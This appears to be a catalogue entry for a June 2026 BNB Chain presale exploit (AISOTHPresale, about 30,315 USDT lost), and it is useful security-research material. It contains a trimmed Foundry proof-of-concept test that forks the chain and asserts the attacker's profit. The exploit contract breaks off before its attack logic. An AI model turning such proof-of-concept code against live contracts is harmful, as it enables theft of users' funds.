# [?] AISOTHPresale - Fixed-price presale arbitrage

## Summary
Severity: Unknown
Chain: BNB Chain
Component: AISOTHPresale
Published: 2026-06-05
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/AISOTHPresale_exp.sol
Type: defi-exploit-poc

## Details
Lost: 30,314.76 USDT

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 102_408_283;
        vm.createSelectFork("bsc", forkBlock);
        fundingToken = USDT_TOKEN;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(PRESALE, "AISOTH Presale");
        vm.label(AIS, "AISOTH");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(USDT_WBNB_PAIR, "USDT/WBNB Pancake pair");
        vm.label(PANCAKE_ROUTER, "Pancake router");
    }

    function testExploit() public {
        AISOTHPresaleExploit exploit = new AISOTHPresaleExploit(ATTACKER);

        uint256 attackerBefore = IERC20(USDT_TOKEN).balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        exploit.attack();

        uint256 profit = IERC20(USDT_TOKEN).balanceOf(ATTACKER) - attackerBefore;
        logTokenBalance(USDT_TOKEN, ATTACKER, "Attacker Final");
        assertGt(profit, 30_000 ether, "USDT profit");
    }
}

contract AISOTHPresaleExploit {
    address private immutable profitReceiver;

    IERC20 private constant usdt = IERC20(USDT_TOKEN);
    IERC20 private constant ais = IERC20(AIS);
    IAISOTHPresale private constant presale = IAISOTHPresale(PRESALE);
    IPancakePair private constant loanPair = IPancakePair(USDT_WBNB_PAIR);
    IPancakeRouter private constant router = IPancakeRouter(PANCAKE_ROUTER);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/AISOTHPresale_exp.sol_
